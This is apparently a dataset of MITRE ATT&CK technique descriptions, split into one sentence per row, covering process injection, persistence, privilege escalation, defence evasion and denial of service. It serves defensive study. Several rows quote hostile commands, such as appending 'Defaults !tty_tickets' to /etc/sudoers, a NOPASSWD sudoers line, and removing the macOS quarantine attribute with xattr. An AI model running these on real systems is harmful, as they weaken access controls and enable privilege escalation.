0,T1055,T1055.011,Extra Window Memory Injection,Adversaries may inject malicious code into process via Extra Window Memory  in order to evade process-based defenses as well as possibly elevate privileges.
1,T1055,T1055.011,Extra Window Memory Injection,EWM injection is a method of executing arbitrary code in the address space of a separate live process.
2,T1055,T1055.011,Extra Window Memory Injection,"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior ."
3,T1055,T1055.011,Extra Window Memory Injection,Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.
4,T1055,T1055.011,Extra Window Memory Injection,This EWM is intended to store data specific to that window and has specific application programming interface  functions to set and get its value.
5,T1055,T1055.011,Extra Window Memory Injection,"Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure."
6,T1055,T1055.011,Extra Window Memory Injection,"Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM."
7,T1055,T1055.011,Extra Window Memory Injection,Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.
8,T1055,T1055.011,Extra Window Memory Injection,Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.
9,T1055,T1055.011,Extra Window Memory Injection,More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention  by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.
10,T1055,T1055.011,Extra Window Memory Injection,"Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges."
11,T1055,T1055.011,Extra Window Memory Injection,Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.
12,T1055,T1055.011,Extra Window Memory Injection,"Epic, has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process."
13,T1055,T1055.011,Extra Window Memory Injection,"Power Loader, overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming  chain and create a malicious thread within Explorer.exe."
14,T1053,T1053.005,Scheduled Task,Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.

19,T1053,T1053.005,Scheduled Task,An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.
20,T1053,T1053.005,Scheduled Task,The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account .
21,T1053,T1053.005,Scheduled Task,"Similar to System Binary Proxy Execution,, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes."
22,T1053,T1053.005,Scheduled Task,"Adversaries may also create ""hidden"" scheduled tasks  Hide Artifacts, that may not be visible to defender tools and manual queries used to enumerate tasks."

163,T1205,T1205.002,Socket Filters,Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control.
164,T1205,T1205.002,Socket Filters,"With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket."

383,T1156,T1156,Malicious Shell Modification,"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile  which are sourced when a user opens a command line interface or connects remotely."
384,T1156,T1156,Malicious Shell Modification,Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order.
385,T1156,T1156,Malicious Shell Modification,"Adversaries have also leveraged the ~/.bashrc file  which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface."
386,T1156,T1156,Malicious Shell Modification,"Some malware targets the termination of a program to trigger execution , adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session."

391,T1156,T1156,Malicious Shell Modification,The interactive shell uses the ~/.zshrc to configure the user environment.
392,T1156,T1156,Malicious Shell Modification,"Upon exiting, /etc/zlogout and ~/.zlogout are executed."
393,T1156,T1156,Malicious Shell Modification,"For legacy programs, macOS executes /etc/bashrc on startup."

1407,T1574,T1574.007,Path Interception by PATH Environment Variable,"Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing."
1408,T1574,T1574.007,Path Interception by PATH Environment Variable,"For example, on Windows if an adversary places a malicious program named ""net.exe"" in `C:\example path`, which by default precedes `C:\Windows\system32\net.exe` in the PATH environment variable, when ""net"" is executed from the command-line the `C:\example path` will be called instead of the system's legitimate executable at `C:\Windows\system32\net.exe`."
1409,T1574,T1574.007,Path Interception by PATH Environment Variable,"Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter,."
1410,T1574,T1574.007,Path Interception by PATH Environment Variable,Adversaries may also directly modify the $PATH variable specifying the directories to be searched.
1411,T1574,T1574.007,Path Interception by PATH Environment Variable,An adversary can modify the `$PATH` variable to point to a directory they have write access.
1412,T1574,T1574.007,Path Interception by PATH Environment Variable,"When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary."
1413,T1574,T1574.007,Path Interception by PATH Environment Variable,"On macOS, this can also be performed through modifying the $HOME variable."
1414,T1574,T1574.007,Path Interception by PATH Environment Variable,"These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification,, or modifying the `/etc/paths.d` folder contents."

1432,T1044,T1044,File System Permissions Weakness,"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process."
1433,T1044,T1044,File System Permissions Weakness,"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM."
1434,T1044,T1044,File System Permissions Weakness,Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.
1435,T1044,T1044,File System Permissions Weakness,If the executing process is set to run at a specific time or during a certain event  then this technique can also be used for persistence.
1436,T1044,T1044,File System Permissions Weakness,"### Services
Manipulation of Windows service binaries is one variation of this technique."
1437,T1044,T1044,File System Permissions Weakness,Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under .
1438,T1044,T1044,File System Permissions Weakness,"Once the service is started, either directly by the user  or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable."
1439,T1044,T1044,File System Permissions Weakness,"### Executable Installers
Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers."
1440,T1044,T1044,File System Permissions Weakness,"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads."
1441,T1044,T1044,File System Permissions Weakness,"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process."
1442,T1044,T1044,File System Permissions Weakness,"This behavior is related to and may take advantage of DLL Search Order Hijacking,."
1443,T1044,T1044,File System Permissions Weakness,Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.
1444,T1044,T1044,File System Permissions Weakness,"This behavior is related to Bypass User Account Control,."
1445,T1044,T1044,File System Permissions Weakness,Several examples of this weakness in existing common installers have been reported to software vendors.
1446,T1044,T1044,File System Permissions Weakness,"An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it."
1447,T1044,T1044,File System Permissions Weakness,"Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface."
1448,T1588,T1588.007,Artificial Intelligence,"Adversaries may obtain access to generative artificial intelligence tools, such as large language models , to aid various techniques during targeting."
1449,T1588,T1588.007,Artificial Intelligence,"These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance,, creating basic scripts, assisting social engineering, and even developing payloads."
1450,T1588,T1588.007,Artificial Intelligence,"For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool."
1451,T1588,T1588.007,Artificial Intelligence,"Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing,/Phishing for Information, campaigns."

1458,T1564,T1564.008,Email Hiding Rules,"Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing, emails sent from the compromised account."
1459,T1564,T1564.008,Email Hiding Rules,Any user or administrator within the organization  may be able to create rules to automatically move or delete emails.
1460,T1564,T1564.008,Email Hiding Rules,These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender.
1461,T1564,T1564.008,Email Hiding Rules,Malicious rules commonly filter out emails based on key words  found in message bodies and subject lines.
1462,T1564,T1564.008,Email Hiding Rules,"In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes."
1463,T1564,T1564.008,Email Hiding Rules,"For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions."
1464,T1564,T1564.008,Email Hiding Rules,Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics .
1465,T1564,T1564.008,Email Hiding Rules,"Scattered Spider, creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products."

1665,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,LLMNR is based upon the Domain Name System  format and allows hosts on the same local link to perform name resolution for other hosts.
1666,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,NBT-NS identifies systems on a local network by their NetBIOS name.
1667,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,"Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR /NBT-NS  traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system."
1668,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,"If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system."
1669,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,"The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing, and crack the hashes offline through Brute Force, to obtain the plaintext passwords."
1670,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,"In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system."
1671,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,The relay step can happen in conjunction with poisoning but may also be independent of it.
1672,T1171,T1171,LLMNR/NBT-NS Poisoning and Relay,"Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder,."
1673,T1590,T1590.005,IP Addresses,Adversaries may gather the victim's IP addresses that can be used during targeting.

1683,T1499,T1499.001,OS Exhaustion Flood,A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity.
1684,T1499,T1499.001,OS Exhaustion Flood,These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.
1685,T1499,T1499.001,OS Exhaustion Flood,"Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods."
1686,T1499,T1499.001,OS Exhaustion Flood,"With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed."
1687,T1499,T1499.001,OS Exhaustion Flood,"Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server."
1688,T1499,T1499.001,OS Exhaustion Flood,ACK floods leverage the stateful nature of the TCP protocol.
1689,T1499,T1499.001,OS Exhaustion Flood,A flood of ACK packets are sent to the target.
1690,T1499,T1499.001,OS Exhaustion Flood,This forces the OS to search its state table for a related TCP connection that has already been established.
1691,T1499,T1499.001,OS Exhaustion Flood,"Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists."
1692,T1499,T1499.001,OS Exhaustion Flood,"When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets."
1693,T1499,T1499.001,OS Exhaustion Flood,This greatly reduces the resources available for providing the targeted service.
1694,T1014,T1014,Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components."

2065,T1548,T1548.003,Sudo and Sudo Caching,Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges.
2066,T1548,T1548.003,Sudo and Sudo Caching,Adversaries may do this to execute commands as other users or spawn processes with higher privileges.
2067,T1548,T1548.003,Sudo and Sudo Caching,"Within Linux and MacOS systems, sudo  allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system."
2068,T1548,T1548.003,Sudo and Sudo Caching,"The sudo command ""allows a system administrator to delegate authority to give certain users  the ability to run some  commands as root or another user while providing an audit trail of the commands and their arguments."""
2069,T1548,T1548.003,Sudo and Sudo Caching,"Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password."
2070,T1548,T1548.003,Sudo and Sudo Caching,This is because sudo has the ability to cache credentials for a period of time.
2071,T1548,T1548.003,Sudo and Sudo Caching,Sudo creates  a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout.
2072,T1548,T1548.003,Sudo and Sudo Caching,"Additionally, there is a tty_tickets variable that treats each new tty  in isolation."

2074,T1548,T1548.003,Sudo and Sudo Caching,"The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals."
2075,T1548,T1548.003,Sudo and Sudo Caching,This also describes which commands users can run as other users or groups.
2076,T1548,T1548.003,Sudo and Sudo Caching,"This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password."
2077,T1548,T1548.003,Sudo and Sudo Caching,"However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL= NOPASSWD: ALL."
2078,T1548,T1548.003,Sudo and Sudo Caching,Elevated privileges are required to edit this file though.
2079,T1548,T1548.003,Sudo and Sudo Caching,Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.
2080,T1548,T1548.003,Sudo and Sudo Caching,"For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range."
2081,T1548,T1548.003,Sudo and Sudo Caching,"If it does, then malware can execute sudo commands without needing to supply the user's password."
2082,T1548,T1548.003,Sudo and Sudo Caching,"Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user."
2083,T1548,T1548.003,Sudo and Sudo Caching,"In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers."

3479,T1527,T1527,Application Access Token,"Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems."
3480,T1527,T1527,Application Access Token,These tokens are typically stolen from users and used in lieu of login credentials.
3481,T1527,T1527,Application Access Token,Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service .
3482,T1527,T1527,Application Access Token,OAuth is one commonly implemented framework that issues tokens to users for access to systems.
3483,T1527,T1527,Application Access Token,These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform.
3484,T1527,T1527,Application Access Token,"Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user."
3485,T1527,T1527,Application Access Token,"Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application."
3486,T1527,T1527,Application Access Token,"For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded."
3487,T1527,T1527,Application Access Token,With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.
3488,T1527,T1527,Application Access Token,Compromised access tokens may be used as an initial step in compromising other services.
3489,T1527,T1527,Application Access Token,"For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines."
3490,T1527,T1527,Application Access Token,Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.
3491,T1527,T1527,Application Access Token,"Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow."
3492,T1562,T1562.009,Safe Mode Boot,Adversaries may abuse Windows safe mode to disable endpoint defenses.
3493,T1562,T1562.009,Safe Mode Boot,Safe mode starts up the Windows operating system with a limited set of drivers and services.

3504,T1180,T1180,Screensaver,Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable  files with a .scr file extension.
3505,T1180,T1180,Screensaver,"The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations."
3506,T1180,T1180,Screensaver,"The following screensaver settings are stored in the Registry  and could be manipulated to achieve persistence:
* SCRNSAVE.exe - set to malicious PE path
* ScreenSaveActive - set to '1' to enable the screensaver
* ScreenSaverIsSecure - set to '0' to not require a password to unlock
* ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed
Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity."
3507,T1542,T1542.005,TFTP Boot,Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol  server.
3508,T1542,T1542.005,TFTP Boot,TFTP boot  is commonly used by network administrators to load configuration-controlled network device images from a centralized management server.
3509,T1542,T1542.005,TFTP Boot,"Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images."
3510,T1542,T1542.005,TFTP Boot,"Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image, to load a modified image on device startup or reset."
3511,T1542,T1542.005,TFTP Boot,"The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality."
3512,T1542,T1542.005,TFTP Boot,"This technique is similar to ROMMONkit, and may result in the network device running a modified image."

3970,T1547,T1547.012,Print Processors,"Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot."
3971,T1547,T1547.012,Print Processors,Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup.
3972,T1547,T1547.012,Print Processors,A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled.
3973,T1547,T1547.012,Print Processors,"Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\SYSTEM\\CurrentControlSet or ControlSet001,\Control\Print\Environments\\Windows architecture: e.g., Windows x64,\Print Processors\\user defined,\Driver Registry key that points to the DLL."
3974,T1547,T1547.012,Print Processors,"For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the GetPrintProcessorDirectory API call, or referenced via a relative path from this directory."
3975,T1547,T1547.012,Print Processors,"After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run."
3976,T1547,T1547.012,Print Processors,"The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges."
3977,T1547,T1547.012,Print Processors,"Gelsemium, can drop itself in C:\Windows\System32\spool\prtprocs\x64\winprint.dll to be loaded automatically by the spoolsv Windows service."

3986,T1487,T1487,Disk Structure Wipe,"To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts,, OS Credential Dumping,, and Windows Admin Shares,."
3987,T1566,T1566.001,Spearphishing Attachment,Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems.
3988,T1566,T1566.001,Spearphishing Attachment,Spearphishing attachment is a specific variant of spearphishing.
3989,T1566,T1566.001,Spearphishing Attachment,Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email.
3990,T1566,T1566.001,Spearphishing Attachment,"In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution, to gain execution."
3991,T1566,T1566.001,Spearphishing Attachment,"There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files."
3992,T1566,T1566.001,Spearphishing Attachment,"Upon opening the attachment , the adversary's payload exploits a vulnerability or directly executes on the user's system."
3993,T1566,T1566.001,Spearphishing Attachment,"The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so."
3994,T1566,T1566.001,Spearphishing Attachment,"The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses."
3995,T1566,T1566.001,Spearphishing Attachment,"Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one."

4128,T1027,T1027.008,Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information."
4129,T1027,T1027.008,Stripped Payloads,Scripts and executables may contain variables names and other strings that help developers document code functionality.
4130,T1027,T1027.008,Stripped Payloads,Symbols are often created by an operating system’s `linker` when executable payloads are compiled.
4131,T1027,T1027.008,Stripped Payloads,Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.
4132,T1027,T1027.008,Stripped Payloads,Adversaries may use stripped payloads in order to make malware analysis more difficult.
4133,T1027,T1027.008,Stripped Payloads,"For example, compilers and other tools may provide features to remove or obfuscate strings and symbols."
4134,T1027,T1027.008,Stripped Payloads,"Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript,, to evade detection and analysis."

4157,T1574,T1574.001,DLL Search Order Hijacking,Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs.
4158,T1574,T1574.001,DLL Search Order Hijacking,Windows systems use a common method to look for required DLLs to load into a program.
4159,T1574,T1574.001,DLL Search Order Hijacking,Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.
4160,T1574,T1574.001,DLL Search Order Hijacking,There are many ways an adversary can hijack DLL loads.
4161,T1574,T1574.001,DLL Search Order Hijacking,"Adversaries may plant trojan dynamic-link library files  in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program."
4162,T1574,T1574.001,DLL Search Order Hijacking,"Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL."
4163,T1574,T1574.001,DLL Search Order Hijacking,Often this location is the current working directory of the program.
4164,T1574,T1574.001,DLL Search Order Hijacking,Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.
4165,T1574,T1574.001,DLL Search Order Hijacking,Phantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.
4166,T1574,T1574.001,DLL Search Order Hijacking,They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.
4167,T1574,T1574.001,DLL Search Order Hijacking,"Adversaries may also directly modify the search order via DLL redirection, which after being enabled  may cause a program to load a different DLL."
4168,T1574,T1574.001,DLL Search Order Hijacking,"If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level."
4169,T1574,T1574.001,DLL Search Order Hijacking,"In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program."
4170,T1574,T1574.001,DLL Search Order Hijacking,Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.
4171,T1574,T1574.001,DLL Search Order Hijacking,"HTTPBrowser, abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll."

4331,T1553,T1553.001,Gatekeeper Bypass,Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs.
4332,T1553,T1553.001,Gatekeeper Bypass,Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host.
4333,T1553,T1553.001,Gatekeeper Bypass,"Gatekeeper was built on top of File Quarantine in Snow Leopard  and has grown to include Code Signing, security policy compliance, Notarization, and more."
4334,T1553,T1553.001,Gatekeeper Bypass,Gatekeeper also treats applications running for the first time differently than reopened applications.
4335,T1553,T1553.001,Gatekeeper Bypass,"Based on an opt-in system, when files are downloaded an extended attribute  called `com.apple.quarantine`  can be set on the file by the application performing the download."
4336,T1553,T1553.001,Gatekeeper Bypass,Launch Services opens the application in a suspended state.
4337,T1553,T1553.001,Gatekeeper Bypass,"For first run applications with the quarantine flag set, Gatekeeper executes the following functions:
1."
4338,T1553,T1553.001,Gatekeeper Bypass,"Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution."
4339,T1553,T1553.001,Gatekeeper Bypass,2.
4340,T1553,T1553.001,Gatekeeper Bypass,"Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers."
4341,T1553,T1553.001,Gatekeeper Bypass,3.
4342,T1553,T1553.001,Gatekeeper Bypass,Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.
4343,T1553,T1553.001,Gatekeeper Bypass,4.
4344,T1553,T1553.001,Gatekeeper Bypass,"Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked."
4345,T1553,T1553.001,Gatekeeper Bypass,"Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified."
4346,T1553,T1553.001,Gatekeeper Bypass,"Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors , unchecked file types, and external libraries."
4347,T1553,T1553.001,Gatekeeper Bypass,"For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks."
4348,T1553,T1553.001,Gatekeeper Bypass,"Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag."
4349,T1553,T1553.001,Gatekeeper Bypass,"Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise,."
4350,T1553,T1553.001,Gatekeeper Bypass,"XCSSET, has dropped a malicious applet into an app's `.../Contents/MacOS/` folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps ."
4351,T1553,T1553.001,Gatekeeper Bypass,"If running with elevated privileges, OSX/Shlayer, has used the spctl command to disable Gatekeeper protection for a downloaded file."
4352,T1553,T1553.001,Gatekeeper Bypass,"OSX/Shlayer, can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions."
4353,T1553,T1553.001,Gatekeeper Bypass,"OSX/Shlayer, has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks."
4354,T1553,T1553.001,Gatekeeper Bypass,"MacMa, has removed the `com.apple.quarantineattribute` from the dropped file, `$TMPDIR/airportpaird`."
4355,T1553,T1553.001,Gatekeeper Bypass,"OSX_OCEANLOTUS.D, uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper."
4356,T1553,T1553.001,Gatekeeper Bypass,"CoinTicker, downloads the EggShell mach-o binary using curl, which does not set the quarantine flag."

4358,T1608,T1608.004,Drive-by Target,"Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise,."
4359,T1608,T1608.004,Drive-by Target,"In such cases, the user's web browser is typically targeted for exploitation , but adversaries may also set up websites for non-exploitation behavior such as Application Access Token,."
4360,T1608,T1608.004,Drive-by Target,"Prior to Drive-by Compromise,, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site."
4361,T1608,T1608.004,Drive-by Target,Drive-by content can be staged on adversary controlled infrastructure that has been acquired  or previously compromised .
4362,T1608,T1608.004,Drive-by Target,"Adversaries may upload or inject malicious web content, such as JavaScript,, into websites."
4363,T1608,T1608.004,Drive-by Target,"This may be done in a number of ways, including:
* Inserting malicious scripts into web pages or other user controllable web content such as forum posts
* Modifying script files served to websites from publicly writeable cloud storage buckets
* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers , Malvertising,
In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser  to ensure it is vulnerable prior to attempting exploitation."
4364,T1608,T1608.004,Drive-by Target,"Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest."
4365,T1608,T1608.004,Drive-by Target,This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.
4366,T1608,T1608.004,Drive-by Target,"Adversaries may purchase domains similar to legitimate domains  during acquisition of infrastructure  to help facilitate Drive-by Compromise,."

4461,T1017,T1017,Application Deployment Software,Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system.
4462,T1017,T1017,Application Deployment Software,"The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints."
4463,T1017,T1017,Application Deployment Software,An attacker exploits two layers of weaknesses in server or client software for automated update mechanisms to undermine the integrity of the target code-base.
4464,T1017,T1017,Application Deployment Software,The first weakness involves a failure to properly authenticate a server as a source of update or patch content.
4465,T1017,T1017,Application Deployment Software,"This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship."
4466,T1017,T1017,Application Deployment Software,"The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update."

5204,T1590,T1590.003,Network Trust Dependencies,Information about network trusts may also be exposed to adversaries via online or other accessible data sets .
5205,T1498,T1498.002,Reflection Amplification,Adversaries may attempt to cause a denial of service  by reflecting a high-volume of network traffic to a target.
5206,T1498,T1498.002,Reflection Amplification,This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address.
5207,T1498,T1498.002,Reflection Amplification,This third-party server is commonly termed a reflector.
5208,T1498,T1498.002,Reflection Amplification,An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim.
5209,T1498,T1498.002,Reflection Amplification,"Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used."
